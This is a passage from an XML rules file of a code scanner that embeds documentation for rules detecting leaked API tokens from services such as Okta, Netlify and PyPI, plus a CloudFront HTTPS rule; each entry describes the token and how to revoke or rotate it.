      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="launchdarkly-personal-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-launch-darkly-personal-token"></div>LaunchDarkly Personal Token</div><a aria-label="Skip link to LaunchDarkly Personal Token" class="heading-anchor-icon fa fa-anchor" href="#launchdarkly-personal-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In LaunchDarkly, all REST API resources are authenticated with either personal or service access tokens, or session cookies. Other authentication mechanisms are not supported. You can manage personal access tokens on your Account settings page. You can configure a personal access token to have the same permissions that you do, or more restrictive permissions. Your personal tokens can never do more than you can in LaunchDarkly. Use a personal token when you want to access the LaunchDarkly API for your temporary or personal use.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<ol>
<li>Navigate to the Account settings page.</li>
<li>Click into the Authorization tab.</li>
<li>Find your token in the "Access tokens" section.</li>
<li>Click the overflow menu for the token and select from the menu:<br/>
"Delete token": Deletes the access token. If you delete a token, API calls made with that token return 401 Unauthorized status codes.</li>
</ol>
<p>You can also use the REST API: Delete access token</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">curl -i -X DELETE \
  'https://app.launchdarkly.com/api/v2/tokens/{id}' \
  -H 'Authorization: YOUR_API_KEY_HERE'
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_52' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_52</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_52' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_53</key>
    <name>Netlify Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="netlify-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-netlify-token"></div>Netlify Token</div><a aria-label="Skip link to Netlify Token" class="heading-anchor-icon fa fa-anchor" href="#netlify-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Netlify provides a platform for building, deploying, and scaling websites whose source files are stored in the version control system Git and then generated into static web content files served via a Content Delivery Network. The platform also provides services and features of serverless computing and edge computing, offering serverless functions that are version-controlled, built, and deployed alongside frontend code.</p>
<p>You can generate a personal access token in your Netlify user settings for manual authentication in shell scripts or commands that use the Netlify API. If you&#8217;re making a public integration with Netlify for others to enjoy, you must use OAuth2. This allows users to authorize your application to use Netlify on their behalf without having to copy/paste API tokens or touch sensitive login info. You&#8217;ll need an application client key and a client secret to integrate with the Netlify API.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>To revoke your user access token for Netlify CLI, go to your Netlify user Applications settings<br/>
For access granted using the netlify login command, scroll to the Authorized applications section, and find Netlify CLI. Select Options &gt; Revoke access.<br/>
If you manually created a personal access token, you can find it in the Personal access tokens section. Select Options &gt; Delete personal token.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_53' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_53</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_53' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_54</key>
    <name>New Relic Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="new-relic-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-new-relic-key"></div>New Relic Key</div><a aria-label="Skip link to New Relic Key" class="heading-anchor-icon fa fa-anchor" href="#new-relic-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>New Relic monitoring solutions use API keys to authenticate and verify user identity. The primary key is the user key (for working with NerdGraph, our GraphQL API). These keys allow only approved people in your organization to report data to New Relic, access that data, and configure features.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>You can view and manage most API keys from the API keys UI page, which is at one.newrelic.com/launcher/api-keys-ui.api-keys-launcher (from the account dropdown, click API keys).</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_54' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_54</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_54' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_55</key>
    <name>Notion Integration Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="notion-integration-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-notion-integration-token"></div>Notion Integration Token</div><a aria-label="Skip link to Notion Integration Token" class="heading-anchor-icon fa fa-anchor" href="#notion-integration-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Notion API uses bearer tokens to authorize requests from integrations. As an integration developer, you'll need to choose the appropriate integration type for the integration you create. Based on the integration type, you'll receive and store bearer tokens differently. For both types, an integration must send the bearer token in the HTTP Authorization request header.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>TBD</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_55' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_55</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_55' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_56</key>
    <name>Okta Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="okta-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-okta-token"></div>Okta Token</div><a aria-label="Skip link to Okta Token" class="heading-anchor-icon fa fa-anchor" href="#okta-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Okta API tokens are used to authenticate requests to the Okta API just like HTTP cookies authenticate requests to the Okta Application with your browser. An API token is issued for a specific user and all requests with the token act on behalf of the user. API tokens are secrets and should be treated like passwords.</p>
<p>API tokens are generated with the permissions of the user that created the token. If a user&#8217;s permissions change, then so do the token&#8217;s. Super admins, org admins, and group admins may create tokens.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>To revoke a token, click the trash icon at the right of the token information. Note that the icon is not always active:</p>
<ul>
<li>Agent tokens are revocable if the agent is not active; otherwise, you must deactivate the agent before revoking the token. Some agents such as the Okta AD Agent automatically revoke their tokens for you when you deactivate the agent.</li>
<li>API Tokens are always revocable.</li>
</ul> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_56' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_56</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_56' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_57</key>
    <name>PagerDuty Authorization Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="pagerduty-authorization-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-pager-duty-authorization-token"></div>PagerDuty Authorization Token</div><a aria-label="Skip link to PagerDuty Authorization Token" class="heading-anchor-icon fa fa-anchor" href="#pagerduty-authorization-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The PagerDuty REST API supports authenticating via an account or user API token. Account API tokens have access to all of the data on an account, and can either be granted read-only access or full access to read, write, update, and delete. For PagerDuty accounts with Advanced Permissions, user API tokens have access to all of the data that the associated user account has access to. Only account administrators have the ability to generate account API tokens.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<ol>
<li>In the web app, navigate to Integrations  API Access Keys.</li>
<li>In the table of API access keys, select Remove next to the key you&#8217;d like to delete.</li>
<li>Confirm your selection in the browser alert.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_57' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_57</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_57' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_58</key>
    <name>PlanetScale Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="planetscale-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-planet-scale-token"></div>PlanetScale Token</div><a aria-label="Skip link to PlanetScale Token" class="heading-anchor-icon fa fa-anchor" href="#planetscale-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>PlanetScale offers a managed database platform that is designed for developers and developer workflows. The PlanetScale CLI allows developers to create development branches, open deploy requests, and make non-blocking schema changes directly from a terminal. </p>
<p>PlanetScale provides the ability to create service tokens for your PlanetScale organization via the CLI or directly in the UI. Service tokens are not recommended for connecting to production databases. Instead, connect securely to your database using PlanetScale connection strings.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<ol>
<li>Go to the service tokens page for your organization: app.planetscale.com/<!-- -->/settings/service-tokens</li>
<li>Click on the service token ID for the service token you would like to delete.</li>
<li>Click on the "Delete service token" button in the upper right hand corner.</li>
<li>Confirm deletion by clicking the "Delete" button in the pop-up modal.</li>
<li>Deleting a service token will sever any database connections that use the given service token.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_58' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_58</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_58' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_59</key>
    <name>Postman API Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="postman-api-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-postman-api-key"></div>Postman API Key</div><a aria-label="Skip link to Postman API Key" class="heading-anchor-icon fa fa-anchor" href="#postman-api-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Postman API endpoints enable developers to integrate Postman within the development toolchain. Developers can add new collections, update existing collections, update environments, and add and run monitors directly through the API. This enables them to programmatically access data stored in a Postman account. They can also combine the Postman API with Newman to integrate Postman with a CI/CD workflow.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<ol>
<li>Open your Postman API Keys page. </li>
<li>Select your avatar in the upper-right corner &gt; Settings. Then select Postman API keys.</li>
<li>Once you have API keys generated you can manage them within your workspace. Select the more actions icon More actions icon next to a key to regenerate or delete it.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_59' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_59</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_59' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_60</key>
    <name>Pulumi Access Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="pulumi-access-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-pulumi-access-token"></div>Pulumi Access Token</div><a aria-label="Skip link to Pulumi Access Token" class="heading-anchor-icon fa fa-anchor" href="#pulumi-access-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Pulumi is a modern infrastructure as code platform. It leverages existing programming languages&#8212;TypeScript, JavaScript, Python, Go, .NET, Java, and markup languages like YAML&#8212;and their native ecosystem to interact with cloud resources through the Pulumi SDK. A downloadable CLI, runtime, libraries, and a hosted service work together to deliver a robust way of provisioning, updating, and managing cloud infrastructure.</p>
<p>Organization Access Tokens provide Enterprise and Business Critical customers the opportunity to manage resources and stack operations for their organization independent of a single-user account.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<ol>
<li>From the organization&#8217;s homepage, follow the same steps as for a Personal Access Token:</li>
<li>Navigate to Settings &gt; Access Tokens.</li>
<li>Choose Delete token from the action menu. You will be prompted in a dialog to confirm your choice.</li>
<li>If you choose to delete a token, its access will immediately be revoked and all further operations using it will fail as unauthorized.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_60' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_60</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_60' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_61</key>
    <name>Python Package Index Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="python-package-index-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-python-package-index-key"></div>Python Package Index Key</div><a aria-label="Skip link to Python Package Index Key" class="heading-anchor-icon fa fa-anchor" href="#python-package-index-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Python Package Index (PyPI) stores meta-data describing distributions packaged with distutils, as well as package data like distribution files if a package author wishes. PyPI lets you submit any number of versions of your distribution to the index. If you alter the meta-data for a particular version, you can submit it again and the index will be updated.</p>
<p>A PyPI API token is a string consisting of a prefix (pypi), a separator (-) and a macaroon serialized with PyMacaroonv2, which means it&#8217;s the base64 of:</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Some content managers run regexes to try and identify published secrets, and ideally have them deactivated. PyPI has started integrating with such systems in order to help secure packages. For more information see: <a href="https://warehouse.pypa.io/development/token-scanning.html?highlight=secrets#token-scanning" target="_self">https://warehouse.pypa.io/development/token-scanning.html?highlight=secrets#token-scanning</a></p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_61' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_61</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_61' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_62</key>
    <name>RapidAPI Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="rapidapi-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-rapid-api-key"></div>RapidAPI Key</div><a aria-label="Skip link to RapidAPI Key" class="heading-anchor-icon fa fa-anchor" href="#rapidapi-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>RapidAPI is used to find, test, and connect to thousands of APIs &#8212; all with a single API key and dashboard. It allows finding APIs, embedding them into an app and tracking usage of all endpoints.</p>
<p>To connect an API to a project or application, you must have an API key to authenticate your request. Creating an app within RapidAPI generates an API key (X-RapidAPI-Key) specific to that application. You can view analytics based on the API calls you make using this app key.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>You can create a new API key and delete the compromised one in a few steps from the Developer Dashboard:</p>
<ol>
<li>Select the application with the compromised key and navigate to the Security page.</li>
<li>Click "Add New Key." You can also edit the API Key name if desired.</li>
<li>Now it is time to test the new API key. Go to the API's Endpoints tab on the RapidAPI Hub listing and select the new API key from the X-RapidAPI-Key dropdown. Click the "Test Endpoint" button to ensure the new API key is working properly.</li>
<li>Update your project with the new API key.</li>
<li>Return to the application's Security page and delete the compromised API key.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_62' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_62</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_62' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_63</key>
    <name>Readme API Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="readme-api-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-readme-api-key"></div>Readme API Key</div><a aria-label="Skip link to Readme API Key" class="heading-anchor-icon fa fa-anchor" href="#readme-api-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>ReadMe offers a managed service for maintaining a documentation site. Each documentation site that you publish on ReadMe is a project. Within a project there is space for documentation, interactive API reference guides, a changelog, and many more features. Each project within your account is published separately.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>If one of your API keys has been leaked or if you have any security concerns about a particular API key, we strongly recommend you rotate out your API keys. You can do so by taking the following steps:</p>
<ul>
<li>Delete the exposed API key in your dashboard (there is a Delete option if you click the three dots on the right-hand side) </li>
<li>The "Edit" and "Delete" options that are available when you click the three dots on the right-hand side of an API key</li>
<li>Re-generate a new API key in its place </li>
<li>Replace any usage of the leaked API key with the new one</li>
</ul> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_63' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_63</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_63' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_34</key>
    <name>Ensure CloudFront distribution ViewerProtocolPolicy is set to HTTPS</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudfront-distribution-viewerprotocolpolicy-is-not-set-to-https"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-front-distribution-viewer-protocol-policy-is-not-set-to-https"></div>CloudFront distribution ViewerProtocolPolicy is not set to HTTPS</div><a aria-label="Skip link to CloudFront distribution ViewerProtocolPolicy is not set to HTTPS" class="heading-anchor-icon fa fa-anchor" href="#cloudfront-distribution-viewerprotocolpolicy-is-not-set-to-https"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p><strong>AWS::CloudFront::Distribution ViewerCertificate</strong> determines the distribution&#8217;s SSL/TLS configuration for communicating with viewers. </p>
<p>We recommend you use the <strong>ViewerProtocolPolicy</strong> parameter to enable secure HTTPS communication between clients and your CloudForamtion templates. Most browsers and clients released after 2010 support server name indication.</p>
<p>AWS recommends to accept HTTPS connections only from viewers that support SNI and advises against receiving HTTPS connections from all viewers, including those that do not support SNI, set SslSupportMethod. This also results in additional monthly charges from CloudFront.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="procedure"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-procedure"></div>Procedure</div><a aria-label="Skip link to Procedure" class="heading-anchor-icon fa fa-anchor" href="#procedure"></a></h2>
<p>Use <strong>ViewerProtocolPolicy</strong> in the <strong>CacheBehavior</strong> or <strong>DefaultCacheBehavior</strong>, and select <strong>Redirect HTTP to HTTPS</strong> or <strong>HTTPS Only</strong>.</p>
<p>To specify how CloudFront should use SSL/TLS to communicate with your custom origin, use <strong>CustomOriginConfig</strong>.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource: </strong> aws_cloudfront_distribution</li>
<li><strong>Argument:</strong> <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">viewer_protocol_policy</code> under <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">default_cache_behavior</code> or <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">ordered_cache_behavior</code> must not be <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">allow-all</code>. Acceptable values are <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">redirect-to-https</code> or <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">https-only</code>.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_cloudfront_distribution" "cloudfront" {
  ...
  default_cache_behavior {
    ...
    target_origin_id       = "my-origin"
 -  viewer_protocol_policy = "allow-all"
 +  viewer_protocol_policy = "redirect-to-https"
  }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource: </strong> AWS::CloudFront::Distribution</li>
<li><strong>Argument:</strong> <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">ViewerProtocolPolicy</code> under Properties.DefaultCacheBehavior or Properties.CacheBehaviors must not be <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">allow-all</code>. Acceptable values are <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">redirect-to-https</code> or <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">https-only</code>.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
    CloudFrontDistribution:
    Type: 'AWS::CloudFront::Distribution'
    Properties:
      DistributionConfig:
        ...
        DefaultCacheBehavior:
          ...
-         ViewerProtocolPolicy: 'allow-all'
